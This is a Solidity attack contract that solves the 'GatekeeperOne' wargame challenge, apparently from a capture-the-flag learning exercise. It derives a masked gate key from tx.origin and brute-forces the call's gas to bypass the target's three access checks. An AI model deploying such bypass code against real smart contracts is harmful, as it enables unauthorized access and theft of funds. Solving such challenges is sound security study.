// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {
    IGatekeeperOne gatekeeper;
    uint256 public gasUsed;

    constructor(address _gatekeeperAddress) {
        gatekeeper = IGatekeeperOne(_gatekeeperAddress);
    }

    function attack() public {
        // Calculate the gateKey
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF; //bypass gate3 and gate1

        uint256 i = 0;
        while (true) { //bypass gate2
            (bool success, ) = address(gatekeeper).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (success || i > 300) {
                gasUsed = (i + (8191 * 3)); // Save the gas used, just for information
                break;
            }
            i++;
        }
    }    
}
